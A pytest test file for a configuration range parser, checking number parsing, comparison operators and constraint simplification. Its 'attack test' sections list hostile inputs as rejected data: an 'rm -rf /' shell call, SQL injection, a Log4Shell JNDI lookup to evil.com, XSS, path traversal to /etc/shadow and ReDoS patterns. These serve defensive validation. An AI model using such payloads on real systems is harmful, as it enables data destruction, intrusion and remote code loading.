import pytest

from alasio.config_dev.parse.parse_range import *


class TestConvertNumber:
    """Test convert_number function"""

    def test_convert_integer_strings(self):
        """Test converting integer strings"""
        assert convert_number("5") == 5
        assert convert_number("0") == 0
        assert convert_number("-10") == -10
        assert convert_number("100") == 100
        assert type(convert_number("5")) == int

    def test_convert_float_strings(self):
        """Test converting float strings"""
        assert convert_number("5.0") == 5.0
        assert convert_number("3.14") == 3.14
        assert convert_number("-2.5") == -2.5
        assert convert_number("0.001") == 0.001
        assert type(convert_number("5.0")) == float

    def test_convert_edge_cases(self):
        """Test edge cases"""
        assert convert_number("0.0") == 0.0
        assert convert_number("-0") == 0
        assert convert_number("-0.0") == -0.0
        assert convert_number("123.") == 123.0  # Trailing decimal point

    @pytest.mark.skip
    def test_convert_scientific_notation(self):
        """Test scientific notation (if supported)"""
        # These may raise exceptions depending on implementation
        with pytest.raises(ValueError):
            convert_number("1e5")
        with pytest.raises(ValueError):
            convert_number("1.5e-3")

    def test_convert_invalid_inputs(self):
        """Attack test: Invalid inputs should raise ValueError"""
        with pytest.raises(ValueError):
            convert_number("abc")

        with pytest.raises(ValueError):
            convert_number("")

        with pytest.raises(ValueError):
            convert_number("1.2.3")

        with pytest.raises(ValueError):
            convert_number("--5")

        with pytest.raises(ValueError):
            convert_number("5.5.5")


class TestParseSingleComparison:
    """Test parse_single_comparison function"""

    def test_greater_than_operators(self):
        """Test greater than operators"""
        assert parse_single_comparison("x>5") == ('gt', 5)
        assert parse_single_comparison(">10") == ('gt', 10)
        assert parse_single_comparison("x>3.14") == ('gt', 3.14)
        assert parse_single_comparison(">-5") == ('gt', -5)

    def test_greater_equal_operators(self):
        """Test greater than or equal operators"""
        assert parse_single_comparison("x>=5") == ('ge', 5)
        assert parse_single_comparison(">=10.5") == ('ge', 10.5)
        assert parse_single_comparison("x>=0") == ('ge', 0)

    def test_less_than_operators(self):
        """Test less than operators"""
        assert parse_single_comparison("x<5") == ('lt', 5)
        assert parse_single_comparison("<10") == ('lt', 10)
        assert parse_single_comparison("x<-3.5") == ('lt', -3.5)

    def test_less_equal_operators(self):
        """Test less than or equal operators"""
        assert parse_single_comparison("x<=5") == ('le', 5)
        assert parse_single_comparison("<=100.25") == ('le', 100.25)
        assert parse_single_comparison("x<=0") == ('le', 0)

    def test_operator_precedence(self):
        """Test operator precedence (<= should take precedence over <)"""
        assert parse_single_comparison("<=5")[0] == 'le'
        assert parse_single_comparison(">=5")[0] == 'ge'

    def test_invalid_operators(self):
        """Attack test: Invalid operators should raise ValueError"""
        with pytest.raises(ValueError):
            parse_single_comparison("x=5")

        with pytest.raises(ValueError):
            parse_single_comparison("x==5")

        with pytest.raises(ValueError):
            parse_single_comparison("x!=5")

        with pytest.raises(ValueError):
            parse_single_comparison("5")

        with pytest.raises(ValueError):
            parse_single_comparison("")

    def test_malformed_expressions(self):
        """Attack test: Malformed expressions should raise ValueError"""
        with pytest.raises(ValueError):
            parse_single_comparison("x>")

        with pytest.raises(ValueError):
            parse_single_comparison(">")

        with pytest.raises(ValueError):
            parse_single_comparison("x>abc")

        with pytest.raises(ValueError):
            parse_single_comparison("x>>5")


class TestParseRange:
    """Test parse_range function"""

    def test_tilde_range_format(self):
        """Test a~b format"""
        assert parse_range("1~10") == {'ge': 1, 'le': 10}
        assert parse_range("0.5~9.5") == {'ge': 0.5, 'le': 9.5}
        assert parse_range("-5~5") == {'ge': -5, 'le': 5}
        assert parse_range("0~0") == {'ge': 0, 'le': 0}

    def test_alternative_tilde_characters(self):
        """Test different tilde characters"""
        assert parse_range("1～10") == {'ge': 1, 'le': 10}  # Full-width tilde
        assert parse_range("1˜10") == {'ge': 1, 'le': 10}  # Small tilde
        assert parse_range("1-10") == {'ge': 1, 'le': 10}  # Hyphen
        assert parse_range("1—10") == {'ge': 1, 'le': 10}  # Em dash

    def test_compound_comparison_format(self):
        """Test a<=x<=b format"""
        assert parse_range("1<=x<=10") == {'ge': 1, 'le': 10}
        assert parse_range("0<x<5") == {'gt': 0, 'lt': 5}
        assert parse_range("1.5<=x<10.5") == {'ge': 1.5, 'lt': 10.5}
        assert parse_range("-10<=x<=0") == {'ge': -10, 'le': 0}

    def test_comma_separated_format(self):
        """Test comma-separated format"""
        assert parse_range(">1,<10") == {'gt': 1, 'lt': 10}
        assert parse_range(">=0,<=100") == {'ge': 0, 'le': 100}
        assert parse_range(">-5.5,<5.5") == {'gt': -5.5, 'lt': 5.5}

    def test_single_comparison_format(self):
        """Test single comparison format"""
        assert parse_range(">5") == {'gt': 5}
        assert parse_range("<=10") == {'le': 10}
        assert parse_range(">=0") == {'ge': 0}
        assert parse_range("<100.5") == {'lt': 100.5}

    def test_whitespace_handling(self):
        """Test whitespace handling"""
        assert parse_range(" 1 ~ 10 ") == {'ge': 1, 'le': 10}
        assert parse_range(" > 5 ") == {'gt': 5}
        assert parse_range("1 <= x <= 10") == {'ge': 1, 'le': 10}
        assert parse_range(" >= 0 , <= 100 ") == {'ge': 0, 'le': 100}

    def test_case_insensitive(self):
        """Test case insensitive parsing"""
        assert parse_range("1<=X<=10") == {'ge': 1, 'le': 10}
        assert parse_range("X>5") == {'gt': 5}

    def test_type_preservation(self):
        """Test type preservation"""
        result = parse_range("1~10")
        assert type(result['ge']) == int
        assert type(result['le']) == int

        result = parse_range("1.0~10.0")
        assert type(result['ge']) == float
        assert type(result['le']) == float

    def test_empty_and_invalid_inputs(self):
        """Attack test: Empty and invalid inputs should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range("")

        with pytest.raises(ValueError):
            parse_range("   ")

        with pytest.raises(ValueError):
            parse_range("abc")

        with pytest.raises(ValueError):
            parse_range("xyz")

    def test_malformed_range_expressions(self):
        """Attack test: Malformed range expressions should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range("~")  # Only separator

        with pytest.raises(ValueError):
            parse_range("1~")  # Missing right boundary

        with pytest.raises(ValueError):
            parse_range("~10")  # Missing left boundary

        with pytest.raises(ValueError):
            parse_range("1~10~20")  # Multiple separators

    # we do allow this
    @pytest.mark.skip
    def test_extreme_values(self):
        """Attack test: Extreme values"""
        # Test very large numbers
        large_num = "999999999999999999"
        result = parse_range(f">{large_num}")
        assert result == {'gt': int(large_num)}

        # Test very small numbers
        small_num = "-999999999999999999"
        result = parse_range(f"<{small_num}")
        assert result == {'lt': int(small_num)}

    def test_multiple_x_variables(self):
        """Attack test: Multiple x variables should raise ValueError"""
        assert parse_range("x>5x<10") == {'gt': 5, 'lt': 10}

    @pytest.mark.parametrize("unicode_input", [
        "x≥5",  # Unicode greater-equal sign
        "x≤10",  # Unicode less-equal sign
        ">5€",  # Number with Euro symbol
        "<10$",  # Number with dollar symbol
    ])
    def test_unicode_and_special_characters(self, unicode_input):
        """Attack test: Unicode and special characters should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(unicode_input)

    @pytest.mark.parametrize("malicious_input", [
        "__import__('os').system('ls')",
        "1; import os; os.system('rm -rf /')",
        "eval('1+1')",
        "exec('print(\"hacked\")')",
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<script>alert('xss')</script>",
    ])
    def test_injection_attempts(self, malicious_input):
        """Attack test: Code injection attempts should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(malicious_input)

    def test_memory_exhaustion_attempts(self):
        """Attack test: Memory exhaustion attempts should raise ValueError"""
        # Moderately long strings should be rejected (suitable for config files)
        moderately_long_string = ">" + "9" * 1000
        with pytest.raises(ValueError):
            parse_range(moderately_long_string)

        # Repeated patterns that might appear in malformed config
        repeated_pattern = "1~10," * 100
        with pytest.raises(ValueError):
            parse_range(repeated_pattern)

    @pytest.mark.parametrize("invalid_nested", [
        ">>5",
        "<<10",
        "><5",
        "<>10",
        ">=<=5",
        "<=>=10",
        "=<5",
        "=>10",
    ])
    def test_nested_operators(self, invalid_nested):
        """Attack test: Nested operators should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(invalid_nested)

    @pytest.mark.parametrize("null_input", [
        "null",
        "NULL",
        "undefined",
    ])
    def test_null_like_string_inputs(self, null_input):
        """Attack test: Null-like string inputs should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(null_input)

    def test_none_input(self):
        """Attack test: None input should raise ValueError or TypeError"""
        with pytest.raises((ValueError, TypeError)):
            parse_range(None)

    @pytest.mark.parametrize("non_string_input", [
        True,
        False,
        [1, 2, 3],
        {"a": 1},
        42,
        3.14,
    ])
    def test_boolean_and_non_string_inputs(self, non_string_input):
        """Attack test: Non-string inputs should raise ValueError or be handled"""
        # The function calls str() on input, so these should be handled
        # but may result in ValueError due to invalid format
        with pytest.raises(ValueError):
            parse_range(non_string_input)

    @pytest.mark.parametrize("path_input", [
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "/etc/shadow",
        "C:\\Windows\\System32",
        "file:///etc/passwd",
    ])
    def test_path_traversal_attempts(self, path_input):
        """Attack test: Path traversal attempts should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(path_input)

    @pytest.mark.parametrize("attack", [
        "%s%s%s%s",
        "%x%x%x%x",
        "%n%n%n%n",
        "{0}{1}{2}",
        "%c%c%c%c",
    ])
    def test_format_string_attacks(self, attack):
        """Attack test: Format string attacks should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(attack)

    @pytest.mark.parametrize("pattern", [
        "a" * 100 + "!",  # Reduced from 10000 for config file context
        "(a+)+$",
        "(a|a)*$",
        "^(a+)+$",
        "^(a*)*$",
    ])
    def test_regex_dos_attempts(self, pattern):
        """Attack test: Regular expression DoS attempts should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(pattern)


class TestIntegrationAndEdgeCases:
    """Integration tests and edge cases"""

    def test_zero_boundary_conditions(self):
        """Test zero boundary conditions"""
        assert parse_range("0~0") == {'ge': 0, 'le': 0}
        assert parse_range(">0") == {'gt': 0}
        assert parse_range(">=0") == {'ge': 0}
        assert parse_range("<0") == {'lt': 0}
        assert parse_range("<=0") == {'le': 0}

    def test_negative_ranges(self):
        """Test negative number ranges"""
        assert parse_range("-10~-5") == {'ge': -10, 'le': -5}
        assert parse_range(">-5") == {'gt': -5}
        assert parse_range("<-5") == {'lt': -5}
        assert parse_range("-5<=x<=-1") == {'ge': -5, 'le': -1}

    def test_decimal_precision(self):
        """Test decimal precision"""
        result = parse_range("0.1~0.9")
        assert result == {'ge': 0.1, 'le': 0.9}

        result = parse_range(">0.0001")
        assert result == {'gt': 0.0001}

        # Test high precision decimals
        result = parse_range("0.123456789~0.987654321")
        assert result == {'ge': 0.123456789, 'le': 0.987654321}

    def test_all_operator_combinations(self):
        """Test all operator combinations"""
        # Ensure all four operators are correctly identified
        result = parse_range(">=1,>2,<=10,<9")
        expected_keys = {'ge', 'gt', 'le', 'lt'}
        assert result == {'gt': 2, 'lt': 9}

    def test_redundant_operators(self):
        """Test handling of redundant operators"""
        # Multiple operators of the same type should overwrite
        result = parse_range(">1,>5")
        assert result == {'gt': 5}  # Last one wins

        result = parse_range("<=10,<=5")
        assert result == {'le': 5}  # Last one wins

    def test_mixed_integer_float_ranges(self):
        """Test mixed integer and float ranges"""
        result = parse_range("1~10.5")
        assert result == {'ge': 1, 'le': 10.5}
        assert type(result['ge']) == int
        assert type(result['le']) == float

        result = parse_range("1.0~10")
        assert result == {'ge': 1.0, 'le': 10}
        assert type(result['ge']) == float
        assert type(result['le']) == int

    @pytest.mark.parametrize("range_input,expected", [
        ("1~10", {'ge': 1, 'le': 10}),
        (">5", {'gt': 5}),
        ("<=100", {'le': 100}),
        ("0.5~9.5", {'ge': 0.5, 'le': 9.5}),
        (">1,<10", {'gt': 1, 'lt': 10}),
        ("1<=x<=10", {'ge': 1, 'le': 10}),
        ("-5~5", {'ge': -5, 'le': 5}),
        (">=0", {'ge': 0}),
    ])
    def test_parametrized_valid_inputs(self, range_input, expected):
        """Parametrized test for valid inputs"""
        assert parse_range(range_input) == expected

    @pytest.mark.parametrize("invalid_input", [
        "",
        "   ",
        "abc",
        "1~10~20",
        "x=5",
        "><5",
        "~",
        "x>",
        ">>5",
        "null",
        "undefined",
        "__import__",
        "'; DROP TABLE",
    ])
    def test_parametrized_invalid_inputs(self, invalid_input):
        """Parametrized test for invalid inputs that should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(invalid_input)

    def test_complex_valid_expressions(self):
        """Test complex but valid expressions"""

        # Complex x-based expressions
        result = parse_range("1.5<=x<=10.5")
        assert result == {'ge': 1.5, 'le': 10.5}

        # Mixed operators with whitespace
        result = parse_range(" >= -5 , <= 15 ")
        assert result == {'ge': -5, 'le': 15}


class TestSecurityAndRobustness:
    """Security and robustness tests"""

    def test_buffer_overflow_attempts(self):
        """Test potential buffer overflow attempts"""
        # Very long valid-looking patterns
        long_number = "1" + "0" * 1000
        with pytest.raises(ValueError):
            parse_range(f">{long_number}")

    @pytest.mark.skip
    def test_control_character_injection(self):
        """Test control character injection"""
        control_chars = [
            "\x00",  # Null byte
            "\x01",  # Start of heading
            "\x08",  # Backspace
            "\x0B",  # Vertical tab
            "\x0C",  # Form feed
            "\x7F",  # Delete
        ]

        for char in control_chars:
            with pytest.raises(ValueError):
                parse_range(f">{char}5")

    @pytest.mark.parametrize("attack", [
        "%3Cscript%3E",  # URL encoded <script>
        "&lt;script&gt;",  # HTML encoded <script>
        "\\u003Cscript\\u003E",  # Unicode encoded <script>
        "\u003Cscript\u003E",  # Unicode <script>
    ])
    def test_encoding_attacks(self, attack):
        """Attack test: Various encoding attacks should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(attack)

    @pytest.mark.parametrize("invalid_number", [
        ">1.2.3",
        "<5..5",
        ">=1e",
        "<=.5.",
        # int(+5) is allowed, so we allow this
        # ">+5",
        "<++5",
        ">=5-",
    ])
    def test_number_parsing_edge_cases(self, invalid_number):
        """Test edge cases in number parsing should raise ValueError"""
        with pytest.raises(ValueError):
            parse_range(invalid_number)


class TestValidateRangeConstraints:
    """Test validate_range_constraints function"""

    def test_valid_constraints(self):
        """Test valid constraint combinations"""
        # Empty dict is valid
        assert validate_range_constraints({})

        # Single constraints are always valid
        assert validate_range_constraints({'gt': 5})
        assert validate_range_constraints({'ge': 5})
        assert validate_range_constraints({'lt': 10})
        assert validate_range_constraints({'le': 10})

        # Valid combinations
        assert validate_range_constraints({'gt': 5, 'lt': 10})
        assert validate_range_constraints({'ge': 5, 'le': 10})
        assert validate_range_constraints({'gt': 0, 'le': 100})
        assert validate_range_constraints({'ge': -5, 'lt': 5})

        # Edge case: ge == le (means exactly equal to that value)
        assert validate_range_constraints({'ge': 5, 'le': 5})

        # Mixed types with valid ranges
        assert validate_range_constraints({'gt': 1.5, 'lt': 2.5})
        assert validate_range_constraints({'ge': -10, 'le': 0.5})

    def test_impossible_gt_constraints(self):
        """Test impossible constraints involving gt (greater than)"""
        # gt >= lt is impossible
        with pytest.raises(ValueError, match="Impossible constraint.*greater than.*less than"):
            validate_range_constraints({'gt': 10, 'lt': 5})

        with pytest.raises(ValueError, match="Impossible constraint.*greater than.*less than"):
            validate_range_constraints({'gt': 5, 'lt': 5})  # gt == lt

        # gt >= le is impossible
        with pytest.raises(ValueError, match="Impossible constraint.*greater than.*less than or equal"):
            validate_range_constraints({'gt': 10, 'le': 5})

        with pytest.raises(ValueError, match="Impossible constraint.*greater than.*less than or equal"):
            validate_range_constraints({'gt': 5, 'le': 5})  # gt == le

    def test_impossible_ge_constraints(self):
        """Test impossible constraints involving ge (greater than or equal)"""
        # ge >= lt is impossible
        with pytest.raises(ValueError, match="Impossible constraint.*greater than or equal.*less than"):
            validate_range_constraints({'ge': 10, 'lt': 5})

        with pytest.raises(ValueError, match="Impossible constraint.*greater than or equal.*less than"):
            validate_range_constraints({'ge': 5, 'lt': 5})  # ge == lt

        # ge > le is impossible
        with pytest.raises(ValueError, match="Impossible constraint.*greater than or equal.*less than or equal"):
            validate_range_constraints({'ge': 10, 'le': 5})

        # But ge == le is valid (exactly equal)
        assert validate_range_constraints({'ge': 5, 'le': 5})

    def test_complex_impossible_constraints(self):
        """Test complex impossible constraint combinations"""
        # Multiple impossible constraints
        with pytest.raises(ValueError):
            validate_range_constraints({'gt': 15, 'ge': 10, 'lt': 5, 'le': 8})

        # Mixed valid and invalid
        with pytest.raises(ValueError):
            validate_range_constraints({'gt': 5, 'ge': 3, 'lt': 4})  # gt > lt

    def test_constraint_simplification(self):
        """Test constraint simplification with simplify=True"""
        # Test upper bounds simplification (le vs lt)

        # Case 1: le is more restrictive (≤5 vs <10)
        constraints = {'le': 5, 'lt': 10}
        original_le = constraints['le']
        assert validate_range_constraints(constraints)
        assert constraints == {'le': 5}  # lt should be removed
        assert constraints['le'] == original_le

        # Case 2: lt is more restrictive (<5 vs ≤10)
        constraints = {'le': 10, 'lt': 5}
        original_lt = constraints['lt']
        assert validate_range_constraints(constraints)
        assert constraints == {'lt': 5}  # le should be removed
        assert constraints['lt'] == original_lt

        # Case 3: Equal values (≤5 vs <5) - lt should win
        constraints = {'le': 5, 'lt': 5}
        assert validate_range_constraints(constraints)
        assert constraints == {'lt': 5}  # lt should be removed

        # Test lower bounds simplification (ge vs gt)

        # Case 4: ge is more restrictive (≥10 vs >5)
        constraints = {'ge': 10, 'gt': 5}
        original_ge = constraints['ge']
        assert validate_range_constraints(constraints)
        assert constraints == {'ge': 10}  # gt should be removed
        assert constraints['ge'] == original_ge

        # Case 5: gt is more restrictive (>10 vs ≥5)
        constraints = {'ge': 5, 'gt': 10}
        original_gt = constraints['gt']
        assert validate_range_constraints(constraints)
        assert constraints == {'gt': 10}  # ge should be removed
        assert constraints['gt'] == original_gt

        # Case 6: Equal values (≥5 vs >5) - gt should win (more restrictive)
        constraints = {'ge': 5, 'gt': 5}
        assert validate_range_constraints(constraints)
        assert constraints == {'gt': 5}  # ge should be removed

    def test_complex_constraint_simplification(self):
        """Test simplification with all four constraint types"""
        # Start with redundant constraints in all directions
        constraints = {
            'gt': 3, 'ge': 5,  # ge is more restrictive
            'lt': 20, 'le': 15  # le is more restrictive
        }

        assert validate_range_constraints(constraints)
        # Should keep the most restrictive in each direction
        assert constraints == {'ge': 5, 'le': 15}

        # Another complex case
        constraints = {
            'gt': 10, 'ge': 8,  # gt is more restrictive
            'lt': 25, 'le': 30  # lt is more restrictive
        }

        assert validate_range_constraints(constraints)
        assert constraints == {'gt': 10, 'lt': 25}

    def test_simplification_preserves_impossible_detection(self):
        """Test that simplification still catches impossible constraints"""
        # Impossible even after simplification
        constraints = {'gt': 15, 'ge': 10, 'lt': 5, 'le': 8}
        with pytest.raises(ValueError, match="Impossible constraint"):
            validate_range_constraints(constraints)

        # Should be simplified to {'ge': 15, 'le': 8} which is still impossible
        constraints = {'gt': 10, 'ge': 15, 'lt': 12, 'le': 8}
        with pytest.raises(ValueError, match="Impossible constraint"):
            validate_range_constraints(constraints)

    def test_no_simplification_when_no_conflicts(self):
        """Test that simplification doesn't affect non-conflicting constraints"""
        # Only one constraint of each type - should remain unchanged
        constraints = {'gt': 5, 'le': 10}
        original = constraints.copy()
        assert validate_range_constraints(constraints)
        assert constraints == original

        # Only upper bounds
        constraints = {'le': 10}
        original = constraints.copy()
        assert validate_range_constraints(constraints)
        assert constraints == original

        # Only lower bounds
        constraints = {'gt': 5}
        original = constraints.copy()
        assert validate_range_constraints(constraints)
        assert constraints == original

    def test_inplace_modification_behavior(self):
        """Test that simplify=True modifies the dict in-place"""
        original_dict = {'gt': 3, 'ge': 5, 'lt': 20, 'le': 15}
        test_dict = original_dict.copy()

        # Verify it's the same object being modified
        dict_id = id(test_dict)
        validate_range_constraints(test_dict)
        assert id(test_dict) == dict_id  # Same object

        # Verify the content changed
        assert test_dict != original_dict
        assert test_dict == {'ge': 5, 'le': 15}

    @pytest.mark.parametrize("input_constraints,expected_simplified", [
        # Upper bounds tests
        ({'le': 5, 'lt': 10}, {'le': 5}),  # le more restrictive
        ({'le': 10, 'lt': 5}, {'lt': 5}),  # lt more restrictive
        ({'le': 5, 'lt': 5}, {'lt': 5}),  # equal - lt wins

        # Lower bounds tests
        ({'ge': 10, 'gt': 5}, {'ge': 10}),  # ge more restrictive
        ({'ge': 5, 'gt': 10}, {'gt': 10}),  # gt more restrictive
        ({'ge': 5, 'gt': 5}, {'gt': 5}),  # equal - gt wins

        # Mixed tests
        ({'gt': 5, 'le': 10}, {'gt': 5, 'le': 10}),  # no conflict
        ({'ge': 0}, {'ge': 0}),  # single constraint
        ({}, {}),  # empty dict
    ])
    def test_parametrized_simplification(self, input_constraints, expected_simplified):
        """Parametrized test for constraint simplification"""
        constraints = input_constraints.copy()
        assert validate_range_constraints(constraints)
        assert constraints == expected_simplified


class TestValidateAndSimplifyRangeConstraints:
    """Test the convenience function validate_and_simplify_range_constraints"""

    def test_convenience_function_impossible_constraints(self):
        """Test that convenience function properly catches impossible constraints"""
        impossible_constraints = [
            {'gt': 10, 'lt': 5},
            {'ge': 10, 'le': 5},
            {'gt': 5, 'le': 5},
            {'ge': 5, 'lt': 5},
        ]

        for constraints in impossible_constraints:
            with pytest.raises(ValueError, match="Impossible constraint"):
                validate_range_constraints(constraints)

    def test_input_validation(self):
        """Test input validation for validate_range_constraints"""
        # Non-dict input
        with pytest.raises(ValueError, match="Range constraints must be a dictionary"):
            validate_range_constraints("not a dict")

        with pytest.raises(ValueError, match="Range constraints must be a dictionary"):
            validate_range_constraints([1, 2, 3])

        with pytest.raises(ValueError, match="Range constraints must be a dictionary"):
            validate_range_constraints(None)

    def test_invalid_keys(self):
        """Test validation of dictionary keys"""
        # Invalid key names
        with pytest.raises(ValueError, match="Invalid range constraint keys"):
            validate_range_constraints({'invalid_key': 5})

        with pytest.raises(ValueError, match="Invalid range constraint keys"):
            validate_range_constraints({'gt': 5, 'bad_key': 10})

        with pytest.raises(ValueError, match="Invalid range constraint keys"):
            validate_range_constraints({'greater_than': 5})  # Should be 'gt'

    def test_invalid_values(self):
        """Test validation of constraint values"""
        # Non-numeric values
        with pytest.raises(ValueError, match="Range constraint.*must be numeric"):
            validate_range_constraints({'gt': 'five'})

        with pytest.raises(ValueError, match="Range constraint.*must be numeric"):
            validate_range_constraints({'le': [10]})

        with pytest.raises(ValueError, match="Range constraint.*must be numeric"):
            validate_range_constraints({'ge': None})

        with pytest.raises(ValueError, match="Range constraint.*must be numeric"):
            validate_range_constraints({'lt': {'value': 10}})

    @pytest.mark.parametrize("valid_constraints", [
        {'gt': 0, 'lt': 10},
        {'ge': -5, 'le': 5},
        {'gt': 1.5, 'lt': 2.5},
        {'ge': 0},
        {'le': 100},
        {'gt': -10, 'le': 0},
        {'ge': 5, 'le': 5},  # Exactly equal
    ])
    def test_parametrized_valid_constraints(self, valid_constraints):
        """Parametrized test for valid constraints"""
        assert validate_range_constraints(valid_constraints)

    @pytest.mark.parametrize("invalid_constraints", [
        {'gt': 10, 'lt': 5},  # gt >= lt
        {'gt': 5, 'lt': 5},  # gt == lt
        {'gt': 10, 'le': 5},  # gt >= le
        {'gt': 5, 'le': 5},  # gt == le
        {'ge': 10, 'lt': 5},  # ge >= lt
        {'ge': 5, 'lt': 5},  # ge == lt
        {'ge': 10, 'le': 5},  # ge > le
    ])
    def test_parametrized_invalid_constraints(self, invalid_constraints):
        """Parametrized test for invalid constraints"""
        with pytest.raises(ValueError, match="Impossible constraint"):
            validate_range_constraints(invalid_constraints)


class TestParseRangeWithValidation:
    """Test parse_range() function"""

    def test_valid_range_expressions(self):
        """Test valid range expressions that result in valid constraints"""
        # Basic valid ranges
        assert parse_range("1~10") == {'ge': 1, 'le': 10}
        assert parse_range(">5") == {'gt': 5}
        assert parse_range("<=100") == {'le': 100}
        assert parse_range(">1,<10") == {'gt': 1, 'lt': 10}

        # Edge case: exact value (ge == le)
        assert parse_range("5~5") == {'ge': 5, 'le': 5}

    def test_invalid_range_expressions_logical(self):
        """Test range expressions that parse but result in logically impossible constraints"""
        # These should parse successfully but fail validation
        with pytest.raises(ValueError, match="Impossible constraint"):
            parse_range(">10,<5")  # Impossible: >10 AND <5

        with pytest.raises(ValueError, match="Impossible constraint"):
            parse_range(">=10,<=5")  # Impossible: >=10 AND <=5

        with pytest.raises(ValueError, match="Impossible constraint"):
            parse_range(">5,<=5")  # Impossible: >5 AND <=5

        with pytest.raises(ValueError, match="Impossible constraint"):
            parse_range(">=5,<5")  # Impossible: >=5 AND <5

    def test_invalid_range_expressions_format(self):
        """Test range expressions that fail during parsing"""
        # These should fail at the parsing stage, not validation stage
        with pytest.raises(ValueError):
            parse_range("invalid_format")

        with pytest.raises(ValueError):
            parse_range(">>5")

        with pytest.raises(ValueError):
            parse_range("")

    @pytest.mark.parametrize("valid_expression,expected", [
        ("1~10", {'ge': 1, 'le': 10}),
        (">5", {'gt': 5}),
        ("<=100", {'le': 100}),
        (">1,<10", {'gt': 1, 'lt': 10}),
        ("0~0", {'ge': 0, 'le': 0}),
        (">=5,<=5", {'ge': 5, 'le': 5}),
    ])
    def test_parametrized_valid_expressions(self, valid_expression, expected):
        """Parametrized test for valid expressions"""
        assert parse_range(valid_expression) == expected

    @pytest.mark.parametrize("impossible_expression", [
        ">10,<5",  # >10 AND <5 impossible
        ">=10,<=5",  # >=10 AND <=5 impossible
        ">5,<=5",  # >5 AND <=5 impossible
        ">=5,<5",  # >=5 AND <5 impossible
        ">100,<50",  # >100 AND <50 impossible
        ">=0,<0",  # >=0 AND <0 impossible
    ])
    def test_parametrized_impossible_expressions(self, impossible_expression):
        """Parametrized test for logically impossible expressions"""
        with pytest.raises(ValueError, match="Impossible constraint"):
            parse_range(impossible_expression)
